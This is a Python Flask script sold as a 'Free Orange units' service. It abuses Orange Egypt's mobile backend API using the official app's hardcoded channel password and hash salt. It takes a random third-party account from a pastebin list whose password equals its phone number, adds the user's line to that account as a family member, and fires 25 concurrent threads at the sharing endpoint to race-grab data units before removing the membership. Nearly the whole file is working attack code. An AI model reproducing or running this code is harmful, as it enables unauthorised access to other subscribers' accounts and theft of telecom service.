import requests
import hashlib
import time
import threading
from threading import Thread
from colorama import Fore
import random
import webbrowser
import sys,os
import pyfiglet
from flask import Flask, request, jsonify, render_template
app = Flask(__name__)
@app.route('/', methods=['POST','GET'])
def index():
	msg=''
	none = "5"
	with requests.Session() as alkapos:
		if none == "5":
			if request.method == 'POST':
			     number2 = request.form['number2']
			     password2 = request.form['password2']
			     
			     
			     
			     
			     responsexx = requests.get("https://1.saaydaarfh.repl.co/")
			     if responsexx.status_code == 200:
			         						if number2 in responsexx.text:
			         							url = "https://services.orange.eg/GetToken.svc/GenerateToken"
			         							header = {
                "Content-Type": "application/json; charset=UTF-8"
            }
			         							data = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'

			         							ctv = requests.post(url, headers=header, data=data).json()["GenerateTokenResult"]["Token"]
			         							htv = hashlib.sha256((ctv + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()
			         							url1 = "https://backend.orange.eg/api/V2/Account/GetDialInfo"
			         							hdd = {
                "_ctv": ctv,
                "_htv": htv,
                "OsVersion": "Android10",
                "AppVersion": "700",
                "IsEasyLogin": "en",
                "IsAndroid": "true",
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "190",
                "Host": "backend.orange.eg",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.14.9",
            }

			         							data3 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"CurrentVersion":"700","dial":"' + number2 + '","isCoin":"true","lang":"ar","isEasyLogin":false,"password":"' + password2 + '"}'

			         							resp = requests.post(url1, headers=hdd, data=data3)
			         							if resp.status_code == 200:
			         								if "فري ماكس 200" in resp.text:
			         									msg =("You are on an invalid system ")
			         									print("You are on an invalid system ")
			         								else:
			         									url = "https://pastebin.com/raw/Rmey6tNV"
			         									response = requests.get(url)
			         									if response.status_code == 200:
			         										numbers = response.json()
			         										number1 = random.choice(numbers)
			         										password1 = number1
       

			         								url_log = "https://services.orange.eg/GetToken.svc/GenerateToken"
			         								header_log = {
                "Content-Type": "application/json; charset=UTF-8"
            }

			         								data_log = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'

			         							
			         								ctv = requests.post(url_log, headers=header_log, data=data_log).json()["GenerateTokenResult"]["Token"]
			         								htv = hashlib.sha256((ctv + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()

			         								url51 = "https://backend.orange.eg/api/HybridFamily/ManageFamily"
			         								headers51 = {
                "_ctv": ctv,
                "_htv": htv,
                "x-microservice-name": "APMS",
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "227",
                "Host": "backend.orange.eg",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.14.9"
            }

			         								data51 = f'{{"ActionType":"1","channel":{{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}},"FamilyMemberDial":"01280981527","FamilyOwnerDial":"{number1}","lang":"en","dial":"{number1}","IsEasyLogin":"false","password":"{password1}"}}'

			         								response51 = requests.post(url51, headers=headers51, data=data51)

			         								if "MaxAmountToBeShared" in response51.text:
			         										data = response51.json()
			         										units = data["MaxAmountToBeShared"]
			         								else:
			         										number1 = random.choice(numbers)
			         										password1 = number1
			         								ctv = requests.post(url_log, headers=header_log, data=data_log).json()["GenerateTokenResult"]["Token"]
			         								htv = hashlib.sha256((ctv + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()

			         								url50 = "https://backend.orange.eg/api/Account/CheckFamily"

			         								headers50 = {
                "_ctv": ctv,
                "_htv": htv,
                "OsVersion": "13",
                "AppVersion": "730",
                "IsAndroid": "true",
                "x-microservice-name": "APMS",
                "Content-Type": "application/json;charset=UTF-8",
                "Content-Length": "196 ",
                "Host": "backend.orange.eg",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.14.9"
            }

			         								data50 = f'{{"channel":{{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}},"CurrentVersion":"730","dial":"{number2}","isCoin":true,"isEasyLogin":false,"lang":"en","password":"{password2}"}}'

			         								response50 = requests.post(url50, headers=headers50, data=data50)
			         								if "012" in response50.text:
			         											numberowner = response50.json()["FamilyOwnerDial"]
			         								else:
			         												numberowner = number1
			         								ctv = requests.post(url_log, headers=header_log, data=data_log).json()["GenerateTokenResult"]["Token"]
			         								htv = hashlib.sha256((ctv + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()
			         								url00 = "https://services.orange.eg/apis/Tariffs/api/Consumptions/GetInclusiveUnits"

			         								payload00 = {
                "Dial": numberowner,
                "MemberType": 1,
                "MemberDial": number2,
                "Language": "en",
                "ChannelName": "MobinilAndMe",
                "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
                "Password": numberowner
            }

			         								headers00 = {
                "_ctv": ctv,
                "_htv": htv,
                "IsEasyLogin": "false",
                "OsVersion": "Android13",
                "IsAndroid": "true",
                "AppVersion": "7.1.0",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.14.9"
            }

			         								response1 = requests.post(url00, json=payload00, headers=headers00)

			         								if response1.status_code == 200:
			         									   					if "Remaining" in response1.text:
			         									   						remaining = float(response1.json()["Units"]["Remaining"])
			         									   					else:
			         									   						remaining = 0
			         								if remaining <= 10.0:
			         									   				url_log1 = "https://services.orange.eg/GetToken.svc/GenerateToken"
			         									   				header_log1 = {
                            "Content-Type": "application/json; charset=UTF-8"
                        }
			         									   				data_log1 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
			         									   				ctv = requests.post(url_log1, headers=header_log, data=data_log).json()["GenerateTokenResult"]["Token"]
			         									   				htv = hashlib.sha256((ctv + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()
			         									   				url9 = "https://backend.orange.eg/api/HybridFamily/ManageFamily"
			         									   				headers9 = {
                            "_ctv": ctv,
                            "_htv": htv,
                            "x-microservice-name": "APMS",
                            "Content-Type": "application/json;charset=UTF-8",
                            "Content-Length": "227",
                            "Host": "backend.orange.eg",
                            "Accept-Encoding": "gzip",
                            "User-Agent": "okhttp/3.14.9"
                        }
			         									   				data9 = f'{{"ActionType":"1","channel":{{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}},"FamilyMemberDial":"{number2}","FamilyOwnerDial":"{numberowner}","lang":"en","dial":"{numberowner}","IsEasyLogin":"false","password":"{numberowner}"}}'
			         									   				response9 = requests.post(url9, headers=headers9, data=data9)
			         									   				if number2 in response9.text:
			         									   					urlog1 = "https://services.orange.eg/GetToken.svc/GenerateToken"
			         									   					headerlog1 = {
                            "Content-Type": "application/json; charset=UTF-8"
                        }

			         									   					datalog1 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
                            
                            
			         									   					ctv1 = requests.post(urlog1, headers=headerlog1, data=datalog1).json()["GenerateTokenResult"]["Token"]

			         									   					htv1 = hashlib.sha256((ctv1 + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()
			         									   					url1 = "https://backend.orange.eg/api/HybridFamily/ManageFamily"
			         									   					headers1 = {
        "_ctv": ctv1,
        "_htv": htv1,
        "Content-Type": "application/json; charset=UTF-8",
        "Content-Length": "242",
        "Host": "backend.orange.eg",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.14.9"
    }
			         									   					data1 = {
        "ActionType": "3",
        "channel": {
            "ChannelName": "MobinilAndMe",
            "Password": "ig3yh*mk5l42@oj7QAR8yF"
        },
        "FamilyMemberDial": number2,
        "FamilyOwnerDial": numberowner,
        "lang": "en",
        "dial": numberowner,
        "IsEasyLogin": False,
        "password": numberowner
    }
			         									   					resspon = requests.post(url1, headers=headers1, json=data1).json()
			         									   				def xmx():
			         									   				   urlog = "https://services.orange.eg/GetToken.svc/GenerateToken"
			         									   				   headerlog = {
            "Content-Type": "application/json; charset=UTF-8"
        }
			         									   				   datalog = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
                                
			         									   				   ctv = requests.post(urlog, headers=headerlog, data=datalog).json()["GenerateTokenResult"]["Token"]
			         									   				   htv = hashlib.sha256((ctv + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()
                                
                                
                                
                                
                                
			         									   				   url = "https://backend.orange.eg/api/HybridFamily/ManageSharing"

			         									   				   headers = {
            "_ctv": ctv,
            "_htv": htv,
            "Content-Type": "application/json; charset=UTF-8",
            "Content-Length": "259",
            "Host": "backend.orange.eg",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.14.9"
        }

			         									   				   data = {
            "ActionType": "2",
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "FamilyMemberDial": number2,
            "lang": "en",
            "Sharing": [{"SharedAmount": units, "SharingType": 5}],
            "dial": number1,
            "IsEasyLogin": False,
            "password": password1
        }

			         									   				   resspo = requests.post(url, headers=headers, json=data).json()
                                

			         									   				for _ in range(25):
			         									   					thread = threading.Thread(target=xmx)
			         									   					thread.start()
                            	
                            
			         									   				time.sleep(0.5)
			         									   				urlog2 = "https://services.orange.eg/GetToken.svc/GenerateToken"
			         									   				headerlog2 = {
                            "Content-Type": "application/json; charset=UTF-8"
                        }
			         									   				datalog2 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'

			         									   				ctv2 = requests.post(urlog2, headers=headerlog2, data=datalog2).json()["GenerateTokenResult"]["Token"]

			         									   				htv2 = hashlib.sha256((ctv2 + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()

			         									   				url5 = "https://services.orange.eg/apis/Tariffs/api/Consumptions/GetInclusiveUnits"

			         									   				payload = {
                            "Dial": numberowner,
                            "MemberType": 1,
                            "MemberDial": number2,
                            "Language": "en",
                            "ChannelName": "MobinilAndMe",
                            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
                            "Password": numberowner
                        }

			         									   				headers5 = {
                            "_ctv": ctv2,
                            "_htv": htv2,
                            "IsEasyLogin": "false",
                            "OsVersion": "Android13",
                            "IsAndroid": "true",
                            "AppVersion": "7.1.0",
                            "Content-Type": "application/json; charset=UTF-8",
                            "Accept-Encoding": "gzip",
                            "User-Agent": "okhttp/3.14.9"
                        }

			         									   				response = requests.post(url5, json=payload, headers=headers5).text

			         									   				if "Remaining" in response:
			         									   					msg =("Units have been added successfully")
			         									   					print("Units have been added successfully")
			         									   				else:
			         									   					msg =("Failed to add, try again ")
			         									   					print("Failed to add, try again ")


			         								else:
			         									   				msg =(f"The number of your units is: {remaining}")
			         									   				print(f"The number of your units is: {remaining}")

			         							else:
			         								msg =("Error in number or password  ")
			         								print("Error in number or password")

			     
			         						else:
			         							msg =("I apologize, but your number is not in the subscriber list. Contact Al-Kaboos. Subscribe and enjoy the Internet and calls throughout the subscription period")
			         							print("I apologize, but your number is not in the subscriber list. Contact Al-Kaboos. Subscribe and enjoy the Internet and calls throughout the subscription period")
			         							return (f"""
<!DOCTYPE html>

<html>
    <head>
        <meta charset="UTF-8"/>
        <meta name="description" content="SCRIPT ORANGE FREE UNITS"/>
        <title>Free Orange units </title>
    </head>


    

    <body align="center">


        <h3>BY: @MR_ALKAP0S</h3>

        <br>
        <br>
        <br> 


        <form method="post">
            
            <fieldset>
                <legend>Free Orange units</legend>
                <br>
                <p style="color:green">{msg}</p>
                <div>
                    <label for="number2"></label>
                    <input id="number2" type="number2" name="number2" placeholder="Number" required>
                    <br>
                    <br>
                    <label for="password2"></label>
                    <input id="password2" type="password2" name="password2" placeholder="Password" required>
                    <br>
                    <br>
                    <input style="background-color: aqua;" type="submit" value="Add">
                </div> 
            </fieldset>

        </form>
    </body>


</html>
""")    



			         							
			         							
			         							
			         							
			         							
			         							
			         							
			         							
			         							
			         							
			         							
			         							

			         							


	return (f"""
<!DOCTYPE html>

<html>
    <head>
        <meta charset="UTF-8"/>
        <meta name="description" content="SCRIPT ORANGE FREE UNITS"/>
        <title>Free Orange units </title>
    </head>


    

    <body align="center">


        <h3>BY: @MR_ALKAP0S</h3>

        <br>
        <br>
        <br> 


        <form method="post">
            
            <fieldset>
                <legend>Free Orange units</legend>
                <br>
                <p style="color:green">{msg}</p>
                <div>
                    <label for="number2"></label>
                    <input id="number2" type="number2" name="number2" placeholder="Number" required>
                    <br>
                    <br>
                    <label for="password2"></label>
                    <input id="password2" type="password2" name="password2" placeholder="Password" required>
                    <br>
                    <br>
                    <input style="background-color: aqua;" type="submit" value="Add">
                </div> 
            </fieldset>

        </form>
    </body>


</html>
""")    

    #return my_html_code

app.run(host='0.0.0.0', port=8080)
    				
            				